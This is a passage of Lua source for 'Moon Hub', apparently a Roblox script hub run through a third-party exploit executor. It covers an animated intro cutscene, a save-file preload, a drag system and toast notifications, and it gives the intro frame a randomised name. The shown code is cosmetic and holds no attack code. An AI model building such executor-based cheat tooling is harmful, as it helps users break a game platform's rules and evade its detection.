-- depuis le fichier de sauvegarde) n'est défini/appelé que bien plus bas,
-- près de la fin de _MH_buildUI — donc APRÈS que la décision ci-dessous
-- ait déjà été prise. Résultat : le toggle "Skip Intro" ne faisait jamais
-- rien au chargement suivant, _introEnabled restait figé sur son défaut
-- (true) le temps que MH_load() tourne. On relit ici, en avance et en
-- pcall complet, uniquement ce seul champ — aucun risque si le fichier
-- n'existe pas encore ou si l'executor ne supporte pas readfile/isfile.
-- Le nom de fichier est dupliqué (voir MH_FILE plus bas) volontairement :
-- garder ce préchargement 100% autonome, à mettre à jour ensemble si l'un
-- des deux change.
-- ===================================================================
pcall(function()
	local preloadFile = "rbxdata_mhv3x_" .. tostring(LP.UserId) .. ".json"
	if type(isfile) == "function" and type(readfile) == "function" and isfile(preloadFile) then
		local ok, raw = pcall(readfile, preloadFile)
		if ok and type(raw) == "string" then
			local dOk, data = pcall(function()
				return game:GetService("HttpService"):JSONDecode(raw)
			end)
			if dOk and type(data) == "table" and type(data.introEnabled) == "boolean" then
				_introEnabled = data.introEnabled
			end
		end
	end
end)

-- ===================================================================
-- INTRO CUTSCENE — poisson koï animé, champ d'étoiles, zoom cinématique
-- ===================================================================
if not INSTANT_UI_LOAD and _introEnabled then
	local introGui = Instance.new("Frame", gui)
	introGui.Name = tostring(math.random(0x10000, 0xFFFFFF))
	introGui.Size = UDim2.new(1,0,1,0)
	introGui.BackgroundColor3 = Color3.fromRGB(2,3,7)
	introGui.BackgroundTransparency = 0
	introGui.ZIndex = 1200
	introGui.BorderSizePixel = 0
	introGui.ClipsDescendants = true
	-- Subtle depth gradient instead of flat black
	addGradient(introGui, Color3.fromRGB(6,10,20), Color3.fromRGB(0,0,0), 90)

	-- Vignette: soft dark edges to frame the scene, done as 4 gradient strips
	do
		local function edgeVignette(size, pos, rot)
			local edge = Instance.new("Frame", introGui)
			edge.Size = size
			edge.Position = pos
			edge.BackgroundColor3 = Color3.new(0,0,0)
			edge.BorderSizePixel = 0
			edge.ZIndex = 30
			local g = Instance.new("UIGradient", edge)
			g.Rotation = rot
			g.Transparency = NumberSequence.new({
				NumberSequenceKeypoint.new(0, 0.35),
				NumberSequenceKeypoint.new(1, 1),
			})
		end
		edgeVignette(UDim2.new(1,0,0,90), UDim2.new(0,0,0,0), 90)
		edgeVignette(UDim2.new(1,0,0,90), UDim2.new(0,0,1,-90), 270)
		edgeVignette(UDim2.new(0,140,1,0), UDim2.new(0,0,0,0), 0)
		edgeVignette(UDim2.new(0,140,1,0), UDim2.new(1,-140,0,0), 180)
	end

	-- Everything scales together for a cinematic zoom-in on load
	local sceneScale = Instance.new("UIScale", introGui)
	sceneScale.Scale = 1.12

	-- Skip button — top-right, theme-coloured
	local _skipDone = false
	local function doSkip()
		if _skipDone then return end
		_skipDone = true
		-- Generic per-descendant fade instead of just fading the backdrop then
		-- hard-Destroying everything: walk every element that exists at click
		-- time and fade whatever's actually visible on it (background/text/
		-- stroke), same principle as an Adapt-style skip — no single "pop" to
		-- black when Destroy() lands.
		for _, child in ipairs(introGui:GetDescendants()) do
			pcall(function()
				if child:IsA("Frame") then
					TweenService:Create(child, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{BackgroundTransparency = 1}):Play()
				elseif child:IsA("TextLabel") then
					TweenService:Create(child, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{TextTransparency = 1}):Play()
				elseif child:IsA("UIStroke") then
					TweenService:Create(child, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{Transparency = 1}):Play()
				end
			end)
		end
		TweenService:Create(introGui, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{BackgroundTransparency = 1}):Play()
		task.delay(0.28, function() pcall(function() introGui:Destroy() end) end)
	end
	do
		local skipBtn = Instance.new("TextButton", introGui)
		skipBtn.AnchorPoint  = Vector2.new(1, 0)
		skipBtn.Position     = UDim2.new(1, -14, 0, 14)
		skipBtn.Size         = UDim2.new(0, 72, 0, 26)
		skipBtn.ZIndex       = 1300
		skipBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		skipBtn.BackgroundTransparency = 0.45
		skipBtn.BorderSizePixel = 0
		skipBtn.Text         = "Skip  ›"
		skipBtn.TextColor3   = C_WHITE
		skipBtn.Font         = Enum.Font.GothamBlack
		skipBtn.TextSize     = 13
		skipBtn.AutoButtonColor = false
		Instance.new("UICorner", skipBtn).CornerRadius = UDim.new(0, 6)
		addLivingTextGradient(skipBtn)
		addLivingStroke(skipBtn, 1)
		skipBtn.MouseButton1Click:Connect(doSkip)
	end

	-- Rising particles
	task.spawn(function()
		while introGui.Parent do
			task.wait(math.random(6,16)/100)
			pcall(function()
				local size = math.random(2,5)
				local particle = Instance.new("Frame", introGui)
				particle.Size = UDim2.new(0,size,0,size)
				particle.Position = UDim2.new(math.random(15,85)/100, 0, 1, 10)
				particle.BackgroundColor3 = math.random()<0.3 and Color3.fromRGB(200,225,255) or C_MOON
				particle.BackgroundTransparency = math.random(30,60)/100
				particle.BorderSizePixel = 0
				particle.ZIndex = 50
				Instance.new("UICorner", particle).CornerRadius = UDim.new(1,0)
				local dur = math.random(25,45)/10
				TweenService:Create(particle, TweenInfo.new(dur, Enum.EasingStyle.Linear),
					{Position = UDim2.new(particle.Position.X.Scale, 0, 0, -10), BackgroundTransparency = 1}):Play()
				task.delay(dur+0.1, function() pcall(function() particle:Destroy() end) end)
			end)
		end
	end)

	-- A few large soft drifting orbs for background depth
	for i = 1, 3 do
		local orb = Instance.new("Frame", introGui)
		orb.Size = UDim2.new(0, math.random(90,150), 0, math.random(90,150))
		orb.Position = UDim2.new(math.random(0,100)/100, 0, math.random(0,100)/100, 0)
		orb.BackgroundColor3 = C_MOON
		orb.BackgroundTransparency = 0.96
		orb.BorderSizePixel = 0
		orb.ZIndex = 10
		addCorner(orb, 200)
		task.spawn(function()
			while orb.Parent do
				TweenService:Create(orb, TweenInfo.new(math.random(30,45)/10, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{Position = UDim2.new(math.random(0,100)/100, 0, math.random(0,100)/100, 0)}):Play()
				task.wait(math.random(30,45)/10)
			end
		end)
	end

	-- Shooting star — a bright streak with a fading trail crossing the sky
	local function fireShootingStar()
		local startX = math.random(5,30)/100
		local startY = math.random(5,25)/100
		local endX = startX + math.random(35,55)/100
		local endY = startY + math.random(20,35)/100
		local trail = Instance.new("Frame", introGui)
		trail.AnchorPoint = Vector2.new(0.5,0.5)
		trail.Size = UDim2.new(0,60,0,2)
		trail.Position = UDim2.new(startX,0,startY,0)
		trail.Rotation = math.deg(math.atan2(endY-startY, endX-startX))
		trail.BackgroundColor3 = C_WHITE
		trail.BorderSizePixel = 0
		trail.BackgroundTransparency = 1
		trail.ZIndex = 40
		local g = Instance.new("UIGradient", trail)
		g.Transparency = NumberSequence.new({
			NumberSequenceKeypoint.new(0,   1),
			NumberSequenceKeypoint.new(0.85,0.4),
			NumberSequenceKeypoint.new(1,   1),
		})
		TweenService:Create(trail, TweenInfo.new(0.12), {BackgroundTransparency = 0.15}):Play()
		TweenService:Create(trail, TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
			Position = UDim2.new(endX,0,endY,0),
			BackgroundTransparency = 1,
		}):Play()
		task.delay(0.6, function() pcall(function() trail:Destroy() end) end)
	end

	-- Shockwave ring — expands outward and fades when the moon bursts in
	local function fireShockwave()
		local ring = Instance.new("Frame", introGui)
		ring.AnchorPoint = Vector2.new(0.5,0.5)
		ring.Position = UDim2.new(0.5,0,0.42,0)
		ring.Size = UDim2.new(0,8,0,8)
		ring.BackgroundTransparency = 1
		ring.ZIndex = 498
		addCorner(ring, 200)
		local stroke = addStroke(ring, C_MOON, 2, 0)
		TweenService:Create(ring, TweenInfo.new(0.75, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{Size = UDim2.new(0,280,0,280)}):Play()
		TweenService:Create(stroke, TweenInfo.new(0.75, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{Transparency = 1}):Play()
		task.delay(0.8, function() pcall(function() ring:Destroy() end) end)
	end

	-- Spark corona — dense burst of thin rays jetting outward from the moon
	-- and dissolving as they stretch, like light escaping around a dark
	-- core. Each ray is a thin Frame pivoted at its own base (AnchorPoint
	-- 0.5,1) so growing its Size.Y stretches it outward from the center
	-- point instead of from a corner; Rotation aims it, a UIGradient fades
	-- the tip so it reads as a spark trail rather than a flat bar.
	local function fireSparkCorona()
		local center = UDim2.new(0.5,0,0.42,0)
		for i = 1, 46 do
			local ang = math.random(0, 3600) / 10
			local len = math.random(50, 150)
			local thick = math.random(1, 2)
			local ray = Instance.new("Frame", introGui)
			ray.AnchorPoint = Vector2.new(0.5, 1)
			ray.Position = center
			ray.Size = UDim2.new(0, thick, 0, 0)
			ray.Rotation = ang
			ray.BackgroundColor3 = math.random() < 0.25 and Color3.fromRGB(200,225,255) or C_WHITE
			ray.BorderSizePixel = 0
			ray.ZIndex = 503
			local g = Instance.new("UIGradient", ray)
			g.Rotation = 90
			g.Transparency = NumberSequence.new({
				NumberSequenceKeypoint.new(0, 0.1),
				NumberSequenceKeypoint.new(1, 1),
			})
			local dur = math.random(35, 60) / 100
			TweenService:Create(ray, TweenInfo.new(dur, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Size = UDim2.new(0, thick, 0, len),
				BackgroundTransparency = 1,
			}):Play()
			task.delay(dur + 0.05, function() pcall(function() ray:Destroy() end) end)
		end
	end

	-- Lueur ambiante lunaire — sphère radiale bleue derrière la lune
	do
		local glowPos = UDim2.new(0.5,0,0.42,0)
		for _, spec in ipairs({{240,0.910},{165,0.930},{95,0.905}}) do
			local g = Instance.new("Frame", introGui)
			g.AnchorPoint = Vector2.new(0.5,0.5)
			g.Position = glowPos
			g.Size = UDim2.new(0,spec[1],0,spec[1])
			g.BackgroundColor3 = Color3.fromRGB(90,170,235)
			g.BackgroundTransparency = spec[2]
			g.BorderSizePixel = 0
			g.ZIndex = 4
			addCorner(g, 200)
		end
	end

	-- Crescent moon icon: bright disc with an offset dark disc cut into it,
	-- plus a slow-rotating orbit ring — replaces the plain dot from before.
	local moonWrap = Instance.new("Frame", introGui)
	moonWrap.AnchorPoint = Vector2.new(0.5,0.5)
	moonWrap.Position = UDim2.new(0.5,0,0.42,0)
	moonWrap.Size = UDim2.new(0,0,0,0)
	moonWrap.BackgroundTransparency = 1
	moonWrap.ZIndex = 501

	local orbitRing = Instance.new("Frame", moonWrap)
	orbitRing.AnchorPoint = Vector2.new(0.5,0.5)
	orbitRing.Position = UDim2.new(0.5,0,0.5,0)
	orbitRing.Size = UDim2.new(2.3,0,0.85,0)   -- ellipse large
	orbitRing.BackgroundTransparency = 1
	orbitRing.Rotation = 0
	orbitRing.ZIndex = 500
	addCorner(orbitRing, 200)
	local orbitStroke, orbitGrad = addLivingStroke(orbitRing, 1)
	orbitStroke.Transparency = 0.62
	local orbitDot = Instance.new("Frame", orbitRing)
	orbitDot.AnchorPoint = Vector2.new(0.5,0.5)
	orbitDot.Position = UDim2.new(0.5,0,0,-2)  -- top of ellipse
	orbitDot.Size = UDim2.new(0,4,0,4)
	orbitDot.BackgroundColor3 = C_MOON2
	orbitDot.BorderSizePixel = 0
	orbitDot.ZIndex = 500
	addCorner(orbitDot, 2)
	local orbitDotGlow = addStroke(orbitDot, C_MOON, 3, 0.4)
	task.spawn(function()
		while orbitRing.Parent do
			orbitRing.Rotation = (orbitRing.Rotation + 3) % 360
			task.wait()
		end
	end)

	-- Soft moonlight halo behind the crescent
	local moonHalo = Instance.new("Frame", moonWrap)
	moonHalo.AnchorPoint = Vector2.new(0.5,0.5)
	moonHalo.Position = UDim2.new(0.5,0,0.5,0)
	moonHalo.Size = UDim2.new(1,0,1,0)
	moonHalo.BackgroundColor3 = C_MOON
	moonHalo.BackgroundTransparency = 0.55
	moonHalo.BorderSizePixel = 0
	moonHalo.ZIndex = 500
	addCorner(moonHalo, 200)
	task.spawn(function()
		while moonHalo.Parent do
			TweenService:Create(moonHalo, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
				{Size = UDim2.new(1.35,0,1.35,0), BackgroundTransparency = 0.75}):Play()
			task.wait(1.4)
			TweenService:Create(moonHalo, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
				{Size = UDim2.new(1,0,1,0), BackgroundTransparency = 0.55}):Play()
			task.wait(1.4)
		end
	end)

	-- Outer second halo — slower, wider pulse
	local moonHalo2 = Instance.new("Frame", moonWrap)
	moonHalo2.AnchorPoint = Vector2.new(0.5,0.5)
	moonHalo2.Position = UDim2.new(0.5,0,0.5,0)
	moonHalo2.Size = UDim2.new(1.6,0,1.6,0)
	moonHalo2.BackgroundColor3 = Color3.fromRGB(90,170,235)
	moonHalo2.BackgroundTransparency = 0.84
	moonHalo2.BorderSizePixel = 0
	moonHalo2.ZIndex = 499
	addCorner(moonHalo2, 200)
	task.spawn(function()
		while moonHalo2.Parent do
			TweenService:Create(moonHalo2, TweenInfo.new(2.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
				{Size = UDim2.new(2.0,0,2.0,0), BackgroundTransparency = 0.93}):Play()
			task.wait(2.1)
			TweenService:Create(moonHalo2, TweenInfo.new(2.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
				{Size = UDim2.new(1.6,0,1.6,0), BackgroundTransparency = 0.84}):Play()
			task.wait(2.1)
		end
	end)

	local moonBase = Instance.new("Frame", moonWrap)
	moonBase.AnchorPoint = Vector2.new(0.5,0.5)
	moonBase.Position = UDim2.new(0.5,0,0.5,0)
	moonBase.Size = UDim2.new(1,0,1,0)
	moonBase.BackgroundColor3 = C_MOON
	moonBase.BorderSizePixel = 0
	moonBase.ZIndex = 501
	addCorner(moonBase, 200)

	-- Small craters for surface texture — start invisible, revealed one by
	-- one in the SEQUENCE below once the moon has landed. Same "pieces
	-- appearing in cascade" idea as Adapt's piece-by-piece image reveal,
	-- just applied to elements we already have instead of new assets.
	local craterSpots = {{0.32,0.38,0.16},{0.6,0.28,0.11},{0.42,0.6,0.13}}
	local craters = {}
	for _, c in ipairs(craterSpots) do
		local crater = Instance.new("Frame", moonBase)
		crater.AnchorPoint = Vector2.new(0.5,0.5)
		crater.Position = UDim2.new(c[1],0,c[2],0)
		crater.Size = UDim2.new(c[3],0,c[3],0)
		crater.BackgroundColor3 = C_MOON2
		crater.BackgroundTransparency = 1
		crater.BorderSizePixel = 0
		crater.ZIndex = 501
		addCorner(crater, 200)
		craters[#craters+1] = crater
	end

	local moonBite = Instance.new("Frame", moonWrap)
	moonBite.AnchorPoint = Vector2.new(0.5,0.5)
	moonBite.Position = UDim2.new(0.62,0,0.38,0)
	moonBite.Size = UDim2.new(0.86,0,0.86,0)
	moonBite.BackgroundColor3 = Color3.fromRGB(2,3,7)
	moonBite.BorderSizePixel = 0
	moonBite.ZIndex = 502
	addCorner(moonBite, 200)

	local nameLbl = Instance.new("TextLabel", introGui)
	nameLbl.AnchorPoint = Vector2.new(0.5,0.5)
	nameLbl.Position = UDim2.new(0.5,0,0.54,0)
	nameLbl.Size = UDim2.new(1,-40,0,50)
	nameLbl.BackgroundTransparency = 1
	nameLbl.Text = "MOON HUB"
	nameLbl.TextColor3 = C_WHITE
	nameLbl.Font = Enum.Font.GothamBlack
	nameLbl.TextSize = 46
	nameLbl.TextTransparency = 1
	nameLbl.ZIndex = 502
	local nameGrad = addLivingTextGradient(nameLbl)

	local subLbl = Instance.new("TextLabel", introGui)
	subLbl.AnchorPoint = Vector2.new(0.5,0.5)
	subLbl.Position = UDim2.new(0.5,0,0.635,0)
	subLbl.Size = UDim2.new(1,-40,0,24)
	subLbl.BackgroundTransparency = 1
	subLbl.Text = "YSLEM  ×  ALN"
	subLbl.TextColor3 = C_DIM
	subLbl.Font = Enum.Font.GothamBold
	subLbl.TextSize = 20
	subLbl.TextTransparency = 1
	subLbl.ZIndex = 502
	addLivingTextGradient(subLbl)

	-- Divider line that draws itself under the subtitle
	local divWrap = Instance.new("Frame", introGui)
	divWrap.AnchorPoint = Vector2.new(0.5,0.5)
	divWrap.Position = UDim2.new(0.5,0,0.685,0)
	divWrap.Size = UDim2.new(0,0,0,1)
	divWrap.BackgroundColor3 = C_MOON
	divWrap.BackgroundTransparency = 0.3
	divWrap.BorderSizePixel = 0
	divWrap.ZIndex = 502

	local verLbl = Instance.new("TextLabel", introGui)
	verLbl.AnchorPoint = Vector2.new(0.5,0.5)
	verLbl.Position = UDim2.new(0.5,0,0.72,0)
	verLbl.Size = UDim2.new(1,-40,0,14)
	verLbl.BackgroundTransparency = 1
	verLbl.Text = "V3"
	verLbl.TextColor3 = C_SILVER2
	verLbl.Font = Enum.Font.Gotham
	verLbl.TextSize = 10
	verLbl.TextTransparency = 1
	verLbl.ZIndex = 502

	-- Champ d'étoiles — 100 étoiles scintillantes (argenté/blanc/bleu)
	local starColors = {C_WHITE, Color3.fromRGB(200,225,255), Color3.fromRGB(180,210,255), Color3.fromRGB(220,235,255)}
	for i = 1, 100 do
		local tw = Instance.new("Frame", introGui)
		local sz = math.random()<0.12 and 2 or 1
		tw.Size = UDim2.new(0,sz,0,sz)
		tw.Position = UDim2.new(math.random(0,100)/100, 0, math.random(0,100)/100, 0)
		tw.BackgroundColor3 = starColors[math.random(1,#starColors)]
		tw.BackgroundTransparency = 1
		tw.BorderSizePixel = 0
		tw.ZIndex = 20
		addCorner(tw, 2)
		task.spawn(function()
			task.wait(math.random(0,30)/10)
			while tw.Parent do
				local peak = math.random(15,60)/100
				local dur = math.random(8,22)/10
				TweenService:Create(tw, TweenInfo.new(dur/2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{BackgroundTransparency = peak}):Play()
				task.wait(dur/2)
				if not tw.Parent then break end
				TweenService:Create(tw, TweenInfo.new(dur/2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{BackgroundTransparency = 1}):Play()
				task.wait(dur/2)
			end
		end)
	end

	-- Star burst finale: a center star plus small sparkles flung outward
	local star = Instance.new("TextLabel", introGui)
	star.AnchorPoint = Vector2.new(0.5,0.5)
	star.Position = UDim2.new(0.5,0,0.8,0)
	star.Size = UDim2.new(0,0,0,0)
	star.BackgroundTransparency = 1
	star.Text = "★"
	star.TextColor3 = C_MOON2
	star.Font = Enum.Font.GothamBold
	star.TextSize = 22
	star.TextTransparency = 1
	star.ZIndex = 502
	addLivingTextGradient(star)

	local function fireStarBurst()
		for i = 1, 10 do
			local ang = (i / 10) * math.pi * 2
			local dist = math.random(55, 100)
			local spark = Instance.new("TextLabel", introGui)
			spark.AnchorPoint = Vector2.new(0.5,0.5)
			spark.Position = UDim2.new(0.5,0,0.8,0)
			spark.Size = UDim2.new(0,14,0,14)
			spark.BackgroundTransparency = 1
			spark.Text = "★"
			spark.TextColor3 = C_MOON2
			spark.Font = Enum.Font.GothamBold
			spark.TextSize = math.random(7,11)
			spark.TextTransparency = 0
			spark.ZIndex = 501
			local dx, dy = math.cos(ang) * dist, math.sin(ang) * dist
			TweenService:Create(spark, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Position = UDim2.new(0.5, dx, 0.8, dy),
				TextTransparency = 1,
			}):Play()
			task.delay(0.65, function() pcall(function() spark:Destroy() end) end)
		end
	end

	-- Bright flash accent — a quick full-screen white pulse for punch
	local function fireFlash(peakTransparency)
		local flash = Instance.new("Frame", introGui)
		flash.Size = UDim2.new(1,0,1,0)
		flash.BackgroundColor3 = C_WHITE
		flash.BackgroundTransparency = 1
		flash.BorderSizePixel = 0
		flash.ZIndex = 999
		TweenService:Create(flash, TweenInfo.new(0.08), {BackgroundTransparency = peakTransparency or 0.82}):Play()
		task.delay(0.08, function()
			pcall(function()
				TweenService:Create(flash, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
				task.delay(0.3, function() pcall(function() flash:Destroy() end) end)
			end)
		end)
	end

	-- ── SFX helper (silent on error) ─────────────────────────────
	local _SS = game:GetService("SoundService")
	local function _sfx(id, vol, pitch)
		pcall(function()
			local s = Instance.new("Sound")
			s.SoundId = "rbxassetid://" .. id
			s.Volume = vol or 0.5
			s.PlaybackSpeed = pitch or 1
			s.RollOffMaxDistance = 0
			s.Parent = _SS
			s:Play()
			game:GetService("Debris"):AddItem(s, 10)
		end)
	end
	-- IDs  1846359858 = pad éthéré / ambient
	--       5791714739 = swoosh sharp étoile
	--       4115432498 = drop cinématique lune
	--       9120386436 = bell titre
	--       2865227271 = arpège sparkle étoile
	--       1369158167 = fade sweep cinématique

	-- ── SEQUENCE ──────────────────────────────────────────────────
	task.spawn(function()
		TweenService:Create(sceneScale, TweenInfo.new(3.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
			{Scale = 1}):Play()
		_sfx(3340803765, 0.20, 0.5)            -- nappe ambiante ouverture
		task.delay(0.1, function()
			fireShootingStar()
			_sfx(260430148, 0.32, 1.0)         -- swoosh profond étoile filante
		end)

		task.wait(0.4)
		-- Moonrise: starts low and rises into place instead of just popping
		-- in at its resting spot — reads as an actual moonrise, not a spawn.
		moonWrap.Size = UDim2.new(0,0,0,0)
		moonWrap.Position = UDim2.new(0.5,0,0.62,0)
		TweenService:Create(moonWrap, TweenInfo.new(0.55, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
			{Size = UDim2.new(0,70,0,70), Position = UDim2.new(0.5,0,0.42,0)}):Play()
		fireShockwave()
		task.delay(0.18, fireShockwave)
		fireSparkCorona()
		fireFlash(0.9)
		_sfx(2545463903, 0.78, 1.0)            -- impact cinématique — apparition de la lune
		task.wait(0.5)

		-- Surface texture catches up piece by piece now that the moon has
		-- landed — a short beat of detail before the title locks in.
		for _, crater in ipairs(craters) do
			TweenService:Create(crater, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{BackgroundTransparency = 0.35}):Play()
			task.wait(0.07)
		end

		-- Glitch reveal: a few scrambled/jittery frames before the title
		-- locks in clean, reads as "the system just booted" rather than a
		-- plain fade — self-contained, restores the label exactly before
		-- the existing Back-Out reveal tween below takes over.
		do
			local GLITCH_CHARS = "#$%&XZQ019/\\"
			local realText = nameLbl.Text
			for i = 1, 6 do
				local scrambled = {}
				for c in realText:gmatch(".") do
					if c ~= " " and math.random() < 0.5 then
						local gi = math.random(1, #GLITCH_CHARS)
						scrambled[#scrambled+1] = GLITCH_CHARS:sub(gi, gi)
					else
						scrambled[#scrambled+1] = c
					end
				end
				nameLbl.Text = table.concat(scrambled)
				nameLbl.TextTransparency = (i % 2 == 0) and 0 or 0.5
				nameLbl.Position = UDim2.new(0.5, math.random(-3,3), 0.54, 0)
				task.wait(0.03)
			end
			nameLbl.Text = realText
			nameLbl.Position = UDim2.new(0.5, 0, 0.54, 0)
			nameLbl.TextTransparency = 1
		end
		nameLbl.TextSize = 62
		TweenService:Create(nameLbl, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
			{TextTransparency = 0, TextSize = 46}):Play()
		_sfx(131322600, 0.40, 1.0)             -- cloche cristal — titre
		task.wait(0.35)
		TweenService:Create(subLbl, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
		task.wait(0.2)
		TweenService:Create(divWrap, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{Size = UDim2.new(0,120,0,1)}):Play()
		task.wait(0.2)
		TweenService:Create(verLbl, TweenInfo.new(0.4), {TextTransparency = 0}):Play()

		task.wait(1.5)

		-- End star: appears, glows, bursts into sparkles, then fades
		star.Size = UDim2.new(0,24,0,24)
		TweenService:Create(star, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
			{TextTransparency = 0}):Play()
		task.wait(0.3)
		fireStarBurst()
		fireFlash(0.94)
		_sfx(876066539, 0.65, 1.0)             -- scintillement magique — étoile burst
		task.wait(0.2)

		-- Text fade out
		TweenService:Create(verLbl, TweenInfo.new(0.2), {TextTransparency = 1}):Play()
		task.wait(0.1)
		TweenService:Create(divWrap, TweenInfo.new(0.2), {Size = UDim2.new(0,0,0,1)}):Play()
		TweenService:Create(subLbl, TweenInfo.new(0.2), {TextTransparency = 1}):Play()
		task.wait(0.1)
		TweenService:Create(nameLbl, TweenInfo.new(0.25), {TextTransparency = 1}):Play()
		TweenService:Create(moonWrap, TweenInfo.new(0.3), {Size = UDim2.new(0,0,0,0)}):Play()
		task.wait(0.3)

		-- The star fades out (last visible element)
		TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
			{TextTransparency = 1}):Play()
		_sfx(131070686, 0.25, 1.0)             -- transition sci-fi — fade out cinématique
		task.wait(0.55)

		-- Continuity: the moon that just introduced the hub flies to the
		-- corner where its little floating icon lives before the curtain
		-- drops — same visual language as the close/open "absorb" animation
		-- later, so the intro hands off into the live menu as one gesture
		-- instead of a hard cut. Guarded: miniBtn is created moments after
		-- this whole intro block runs, so by the time this fires (a few
		-- seconds in) it always exists — the pcall is just a safety net.
		pcall(function()
			local mb = _GH.miniBtn
			if mb then
				local targetAbs = mb.AbsolutePosition + mb.AbsoluteSize/2
				TweenService:Create(moonWrap, TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
					Position = UDim2.new(0, targetAbs.X, 0, targetAbs.Y),
					Size = UDim2.new(0,8,0,8),
				}):Play()
			end
		end)
		TweenService:Create(introGui, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
		task.wait(0.42)
		introGui:Destroy()
	end)
end



-- ===================================================================
-- DRAG SYSTEM — no dragPosLabel (green Y: label removed)
-- ===================================================================
local _uiLocked = false          -- LOCK : quand true, aucun drag ne fonctionne
local _dragStates = {}           -- registry of all created drag states
local _activeDrag = nil
local _MH_positions = {}         -- registry of draggable frames keyed by posId
_GH.positions = _MH_positions

-- Keeps a dragged position's absolute top-left corner inside the viewport —
-- without this, dragging any window (the moon icon included) far enough
-- toward an edge could push it fully off-screen with no way to grab it
-- back. Only ever adjusts the Offset component, at whatever Scale the
-- frame already had — same convention the drag delta above already uses.
local function _clampToScreen(frame, pos)
	local cam = workspace.CurrentCamera
	if not cam then return pos end
	local vp = cam.ViewportSize
	if vp.X <= 0 or vp.Y <= 0 then return pos end
	local absSize = frame.AbsoluteSize
	local anchor  = frame.AnchorPoint
	local topLeftX = pos.X.Scale * vp.X + pos.X.Offset - anchor.X * absSize.X
	local topLeftY = pos.Y.Scale * vp.Y + pos.Y.Offset - anchor.Y * absSize.Y
	local clampedX = math.clamp(topLeftX, 0, math.max(0, vp.X - absSize.X))
	local clampedY = math.clamp(topLeftY, 0, math.max(0, vp.Y - absSize.Y))
	local offX = clampedX - pos.X.Scale * vp.X + anchor.X * absSize.X
	local offY = clampedY - pos.Y.Scale * vp.Y + anchor.Y * absSize.Y
	return UDim2.new(pos.X.Scale, offX, pos.Y.Scale, offY)
end

UIS.InputChanged:Connect(function(inp)
	if not _activeDrag then return end
	if inp ~= _activeDrag.dragInput then return end
	if not _activeDrag.dragging then return end
	local dx = inp.Position.X - _activeDrag.dragStart.X
	local dy = inp.Position.Y - _activeDrag.dragStart.Y
	local sp = _activeDrag.startPos
	local newPos = UDim2.new(sp.X.Scale, sp.X.Offset+dx, sp.Y.Scale, sp.Y.Offset+dy)
	_activeDrag.frame.Position = _clampToScreen(_activeDrag.frame, newPos)
end)

local function makeDraggable(frame, handle, posId)
	local src = handle or frame
	local state = { frame=frame, dragging=false, dragInput=nil, dragStart=nil, startPos=nil }
	_dragStates[#_dragStates+1] = state
	if posId then _MH_positions[posId] = frame end
	src.InputBegan:Connect(function(inp)
		if _uiLocked then return end   -- LOCK: blocks drag from starting
		if inp.UserInputType == Enum.UserInputType.MouseButton1
			or inp.UserInputType == Enum.UserInputType.Touch then
			state.dragging = true
			state.dragStart = inp.Position
			state.startPos = frame.Position
			_activeDrag = state
			inp.Changed:Connect(function()
				if inp.UserInputState == Enum.UserInputState.End then
					state.dragging = false
					if _activeDrag == state then _activeDrag = nil end
					if posId and _GH.autoSave then _GH.autoSave() end
				end
			end)
		end
	end)
	src.InputChanged:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseMovement
			or inp.UserInputType == Enum.UserInputType.Touch then
			state.dragInput = inp
		end
	end)
end

-- Toggle drag lock (called by the 🔓/🔒 button in the title bar)
-- Locks EVERYTHING: main menu, widgets, and floating buttons.
local function setDragLock(on)
	_uiLocked = on
	if on then
		-- Cancel any drag in progress
		for _, st in ipairs(_dragStates) do st.dragging = false end
		_activeDrag = nil
	end
	if _GH.setFloatLocked then _GH.setFloatLocked(on) end
end

-- ===================================================================
-- TOAST NOTIFICATIONS — small fading badge, top-center, stacks vertically
-- ===================================================================
local toastLayer = Instance.new("Frame", gui)
toastLayer.Name = "ToastLayer"
toastLayer.AnchorPoint = Vector2.new(0.5,0)
toastLayer.Position = UDim2.new(0.5,0,0,10)
toastLayer.Size = UDim2.new(0,240,0,0)
toastLayer.AutomaticSize = Enum.AutomaticSize.Y
toastLayer.BackgroundTransparency = 1
toastLayer.ZIndex = 200
local toastLL = Instance.new("UIListLayout", toastLayer)
toastLL.SortOrder = Enum.SortOrder.LayoutOrder
toastLL.HorizontalAlignment = Enum.HorizontalAlignment.Center
toastLL.Padding = UDim.new(0,6)

local _toastOrder = 0
local function showToast(text, kind)
	_toastOrder = _toastOrder + 1
	local order = _toastOrder
	local accent = (kind=="off" and C_RED) or (kind=="info" and C_MOON) or C_GREEN
